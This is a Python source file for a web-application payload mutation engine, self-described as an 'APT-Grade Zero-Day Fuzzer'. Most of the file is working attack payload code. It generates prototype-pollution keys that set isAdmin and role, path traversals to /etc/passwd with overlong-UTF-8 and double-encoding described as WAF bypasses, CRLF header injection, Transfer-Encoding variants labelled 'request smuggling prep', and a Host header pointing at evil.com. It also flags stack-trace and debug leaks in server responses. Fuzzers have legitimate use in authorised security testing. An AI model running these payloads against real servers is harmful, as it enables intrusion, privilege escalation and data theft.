"""
Advanced Payload Mutation Engine — APT-Grade Zero-Day Fuzzer.

Techniques implemented:
- HTTP Parameter Pollution (HPP) with framework-specific quirks
- Type Confusion (Int→Array, String→Object, JSON→XML)
- Null Byte / Overlong UTF-8 injection
- Prototype Pollution payloads (__proto__, constructor)
- Content-Type desync (JSON body + XML header, multipart abuse)
- Integer overflow / underflow boundary values
- Unicode normalization abuse (NFKC/NFC bypasses)
- Path traversal via encoding layers (double-encode, overlong UTF-8)
- Header injection / CRLF via folding and obsolete line folding
"""
import random
import string
import copy
import json as json_lib
import urllib.parse
from typing import Dict, Any, List, Optional


class PayloadMutator:
    """
    Zero-Day Fuzzing & Mutation Engine.

    Designed to trigger Unhandled Exceptions, parser differentials,
    and logic flaws in backend frameworks (Django, Express, Spring, Rails, PHP).
    """

    # Boundary Integer Values (crash triggers)
    INT_BOUNDARIES = [
        0, -1, -0, 1,
        127, 128, 255, 256,                    # 8-bit boundaries
        32767, 32768, 65535, 65536,            # 16-bit
        2147483647, 2147483648,                # 32-bit signed
        4294967295, 4294967296,                # 32-bit unsigned
        9223372036854775807,                   # 64-bit signed max
        -9223372036854775808,                  # 64-bit signed min
        99999999999999999999999999999999,       # BigInt overflow
    ]

    # Prototype Pollution Keys
    PROTO_KEYS = [
        "__proto__", "constructor", "prototype",
        "__proto__[isAdmin]", "__proto__[role]",
        "constructor[prototype][isAdmin]",
        "__proto__.isAdmin", "__proto__.role",
        "constructor.prototype.toString",
    ]

    # Unicode Normalization Attack Strings
    UNICODE_PAYLOADS = [
        "\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e",  # Fullwidth <script>
        "\u2025\u2025/\u2025\u2025/etc/passwd",                # Two-dot leader traversal
        "\uff0e\uff0e\uff0f",                                  # Fullwidth ../
        "..%c0%af",                                            # Overlong UTF-8 slash
        "..%ef%bc%8f",                                         # Fullwidth /
        "%e0%80%af",                                           # Overlong UTF-8
        "\u202e\u0041\u0042\u0043",                            # RTL override
    ]

    # Encoding Layers for WAF Bypass
    ENCODING_LAYERS = [
        lambda s: urllib.parse.quote(s),                        # Single encode
        lambda s: urllib.parse.quote(urllib.parse.quote(s)),    # Double encode
        lambda s: s.replace("/", "%252f"),                      # Double-encoded slash
        lambda s: s.replace("'", "%27").replace('"', "%22"),   # Quote encoding
        lambda s: s.replace("<", "%u003c").replace(">", "%u003e"),  # IIS Unicode
    ]

    def __init__(self, aggressiveness: int = 2):
        """
        Args:
            aggressiveness: 1=light (HPP/null), 2=medium (+proto/type), 3=heavy (+unicode/overflow)
        """
        self.aggressiveness = aggressiveness

# QUERY STRING MUTATIONS

    def mutate_query_params(self, url: str) -> List[str]:
        """Generate anomalous query string mutations for zero-day discovery."""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return []

        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        mutated_urls = []

        for key in list(qs.keys()):
            # HPP: Duplicate parameters
            qs_copy = {k: list(v) for k, v in qs.items()}
            qs_copy[key].append("mutated_hpp")
            new_q = urllib.parse.urlencode(qs_copy, doseq=True)
            mutated_urls.append(parsed._replace(query=new_q).geturl())

            # Array notation: ?id[]=1
            qs_arr = {k: list(v) for k, v in qs.items()}
            val = qs_arr.pop(key)
            qs_arr[f"{key}[]"] = val
            new_q = urllib.parse.urlencode(qs_arr, doseq=True)
            mutated_urls.append(parsed._replace(query=new_q).geturl())

            # Null byte termination
            qs_null = {k: list(v) for k, v in qs.items()}
            qs_null[key] = [v + "%00" for v in qs_null[key]]
            new_q = urllib.parse.urlencode(qs_null, doseq=True)
            mutated_urls.append(parsed._replace(query=new_q).geturl())

            # Type confusion: ?id[0]=1 (array index)
            qs_tc = {k: list(v) for k, v in qs.items()}
            val = qs_tc.pop(key)
            qs_tc[f"{key}[0]"] = val
            new_q = urllib.parse.urlencode(qs_tc, doseq=True)
            mutated_urls.append(parsed._replace(query=new_q).geturl())

            if self.aggressiveness >= 2:
                # Prototype Pollution via query string
                for proto_key in self.PROTO_KEYS[:4]:
                    pp_q = urllib.parse.urlencode({proto_key: "true"})
                    combined = parsed.query + "&" + pp_q
                    mutated_urls.append(parsed._replace(query=combined).geturl())

                # Integer boundary injection
                for boundary in self.INT_BOUNDARIES[:6]:
                    qs_int = {k: list(v) for k, v in qs.items()}
                    qs_int[key] = [str(boundary)]
                    new_q = urllib.parse.urlencode(qs_int, doseq=True)
                    mutated_urls.append(parsed._replace(query=new_q).geturl())

            if self.aggressiveness >= 3:
                # Unicode normalization attacks
                for uni in self.UNICODE_PAYLOADS[:3]:
                    qs_uni = {k: list(v) for k, v in qs.items()}
                    qs_uni[key] = [uni]
                    new_q = urllib.parse.urlencode(qs_uni, doseq=True)
                    mutated_urls.append(parsed._replace(query=new_q).geturl())

                # Multi-encoding layers
                for encode_fn in self.ENCODING_LAYERS[:2]:
                    qs_enc = {k: list(v) for k, v in qs.items()}
                    qs_enc[key] = [encode_fn(qs_enc[key][0])]
                    new_q = urllib.parse.urlencode(qs_enc, doseq=True)
                    mutated_urls.append(parsed._replace(query=new_q).geturl())

        return list(set(mutated_urls))

# HEADER MUTATIONS

    def mutate_headers(self, headers: Dict[str, str]) -> List[Dict[str, str]]:
        """Generate anomalous header mutations for desync/bypass."""
        mutated = []

        # CRLF Injection via header value
        h1 = dict(headers)
        h1["X-Forwarded-For"] = "127.0.0.1\r\nX-Injected: true"
        mutated.append(h1)

        # Obsolete Line Folding (RFC 7230 violation)
        h_fold = dict(headers)
        h_fold["X-Custom"] = "normal\r\n\tcontinued-value"
        mutated.append(h_fold)

        # Content-Type desync
        if "Content-Type" in headers:
            # Append anomalous charset/boundary
            h2 = dict(headers)
            h2["Content-Type"] = headers["Content-Type"] + '; charset=utf-8; boundary="anomalous"'
            mutated.append(h2)

            # Swap JSON↔XML
            h3 = dict(headers)
            ct = h3["Content-Type"]
            if "json" in ct:
                h3["Content-Type"] = "application/xml"
            elif "form" in ct:
                h3["Content-Type"] = "application/json"
            elif "xml" in ct:
                h3["Content-Type"] = "application/json"
            mutated.append(h3)

            # Multipart without proper boundary
            h4 = dict(headers)
            h4["Content-Type"] = "multipart/form-data"  # missing boundary= intentionally
            mutated.append(h4)

        # Transfer-Encoding obfuscation (request smuggling prep)
        te_variants = [
            "chunked",
            " chunked",                     # leading space
            "chunked, identity",            # multiple values
            "\tchunked",                    # tab prefix
            "chunked\x00",                  # null terminator
            "chunked\r\nTransfer-Encoding: identity",  # header injection
        ]
        for te in te_variants:
            h_te = dict(headers)
            h_te["Transfer-Encoding"] = te
            mutated.append(h_te)

        # Host header manipulation
        if "Host" in headers:
            host = headers["Host"]
            # Port injection
            h_port = dict(headers)
            h_port["Host"] = f"{host}:@evil.com"
            mutated.append(h_port)

            # Absolute URL in Host
            h_abs = dict(headers)
            h_abs["Host"] = f"http://{host}"
            mutated.append(h_abs)

        return mutated

# JSON BODY MUTATIONS

    def mutate_json(self, json_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate anomalous JSON mutations for parser confusion."""
        mutated = []
        if not json_data:
            return mutated

        # Type Confusion (String→Array, Int→String, Bool→Int)
        m1 = copy.deepcopy(json_data)
        for k, v in m1.items():
            if isinstance(v, int):
                m1[k] = str(v) + "''"
            elif isinstance(v, str):
                m1[k] = [v]
            elif isinstance(v, bool):
                m1[k] = 1 if v else 0
        mutated.append(m1)

        # Integer overflow
        m2 = copy.deepcopy(json_data)
        for k, v in m2.items():
            if isinstance(v, (int, float)):
                m2[k] = 9223372036854775807  # Int64 max
        mutated.append(m2)

        # Null injection
        m3 = copy.deepcopy(json_data)
        for k, v in m3.items():
            if isinstance(v, str):
                m3[k] = v + "\x00"
        mutated.append(m3)

        # Prototype Pollution via JSON
        m4 = copy.deepcopy(json_data)
        m4["__proto__"] = {"isAdmin": True, "role": "admin"}
        mutated.append(m4)

        m5 = copy.deepcopy(json_data)
        m5["constructor"] = {"prototype": {"isAdmin": True}}
        mutated.append(m5)

        if self.aggressiveness >= 2:
            # Deeply nested object (stack overflow trigger)
            m6 = copy.deepcopy(json_data)
            nested = {"a": True}
            for _ in range(50):
                nested = {"nested": nested}
            m6["deep"] = nested
            mutated.append(m6)

            # Unicode key confusion
            m7 = copy.deepcopy(json_data)
            for k in list(m7.keys()):
                # Homoglyph key: replace 'a' with Cyrillic 'а' (U+0430)
                new_key = k.replace("a", "\u0430").replace("e", "\u0435")
                if new_key != k:
                    m7[new_key] = m7[k]
            mutated.append(m7)

            # Massive string (buffer overflow probe)
            m8 = copy.deepcopy(json_data)
            for k, v in m8.items():
                if isinstance(v, str):
                    m8[k] = "A" * 65536
                    break  # only one field to avoid huge payloads
            mutated.append(m8)

        if self.aggressiveness >= 3:
            # Duplicate keys (parser differential)
            # JSON spec says last-key-wins, but parsers differ
            for k, v in json_data.items():
                raw = json_lib.dumps(json_data)
                # Inject duplicate key with different value
                inject = f'"{k}":"MUTATED_DUPE"'
                raw = raw[:-1] + "," + inject + "}"
                mutated.append({"__raw_json__": raw})
                break

            # Scientific notation confusion
            m9 = copy.deepcopy(json_data)
            for k, v in m9.items():
                if isinstance(v, (int, float)):
                    m9[k] = float("1e308")  # Near infinity
            mutated.append(m9)

        return mutated

# PATH MUTATIONS (for LFI/SSRF bypass)

    def mutate_path(self, path: str) -> List[str]:
        """Generate path traversal mutations with encoding bypass layers."""
        mutations = []

        # Standard traversals
        traversals = [
            "../", "..\\", "....//", "..;/",
            "..%00/", "..%0d%0a/",
        ]
        for t in traversals:
            mutations.append(t * 5 + path)

        # Encoding layers
        for encode_fn in self.ENCODING_LAYERS:
            mutations.append(encode_fn("../" * 5 + path))

        # Overlong UTF-8 slash bypass
        overlong_slashes = [
            "%c0%af", "%c1%1c", "%c0%2f",  # Overlong /
            "%c0%ae",                        # Overlong .
            "%e0%80%af",                     # 3-byte overlong /
        ]
        for os in overlong_slashes:
            mutations.append(f"..{os}" * 3 + path)

        # Null byte termination (PHP < 5.3.4)
        mutations.append("../" * 5 + path + "%00")
        mutations.append("../" * 5 + path + "\x00.jpg")

        # Path normalization tricks
        mutations.append(f"/{path}/../../../etc/passwd")
        mutations.append(f"/..;/{path}")
        mutations.append(f"/.;/{path}")  # Tomcat/Spring

        return list(set(mutations))

# ANOMALY DETECTION (Response Diffing)

    @staticmethod
    def detect_anomaly(baseline: dict, mutated_response: dict) -> Optional[str]:
        """
        Compare a mutated response against baseline to detect anomalous behavior.
        Returns description of anomaly, or None if response is normal.
        """
        if not baseline or not mutated_response:
            return None

        b_status = baseline.get("status", 0)
        m_status = mutated_response.get("status", 0)
        b_body = baseline.get("body", "")
        m_body = mutated_response.get("body", "")
        b_time = baseline.get("time", 0)
        m_time = mutated_response.get("time", 0)

        anomalies = []

        # Status code change (especially to 500/502/503)
        if m_status != b_status:
            if m_status >= 500:
                anomalies.append(f"Server Error {m_status} (baseline: {b_status})")
            elif m_status in (401, 403) and b_status == 200:
                anomalies.append(f"Auth boundary hit: {b_status}→{m_status}")

        # Response body size anomaly (>50% difference)
        if len(b_body) > 100 and len(m_body) > 0:
            ratio = len(m_body) / len(b_body)
            if ratio > 3.0:
                anomalies.append(f"Body inflated {ratio:.1f}x (possible data leak)")
            elif ratio < 0.2:
                anomalies.append(f"Body deflated to {ratio:.1%} (possible filter)")

        # Timing anomaly (>3x slower = possible injection/sleep)
        if b_time > 0 and m_time > b_time * 3 and m_time > 2.0:
            anomalies.append(f"Timing anomaly: {m_time:.2f}s vs {b_time:.2f}s baseline")

        # Stack trace / error leak detection
        error_markers = [
            "Traceback (most recent", "Exception in thread",
            "at java.", "at org.", "at com.",
            "Fatal error:", "Parse error:", "Warning:",
            "System.NullReferenceException",
            "TypeError:", "ReferenceError:",
            "SQLSTATE[", "ORA-", "PG::",
            "stack trace:", "panic:",
        ]
        for marker in error_markers:
            if marker.lower() in m_body.lower() and marker.lower() not in b_body.lower():
                anomalies.append(f"Error leak: '{marker}' in response")
                break

        # Debug info leak
        debug_markers = [
            "DEBUG", "DJANGO_SETTINGS_MODULE", "X-Debug-Token",
            "server_software", "PHP_SELF", "DOCUMENT_ROOT",
        ]
        for marker in debug_markers:
            if marker in m_body and marker not in b_body:
                anomalies.append(f"Debug leak: '{marker}'")
                break

        return " | ".join(anomalies) if anomalies else None


# Singleton instances for different aggressiveness levels
mutator = PayloadMutator(aggressiveness=2)
mutator_light = PayloadMutator(aggressiveness=1)
mutator_heavy = PayloadMutator(aggressiveness=3)
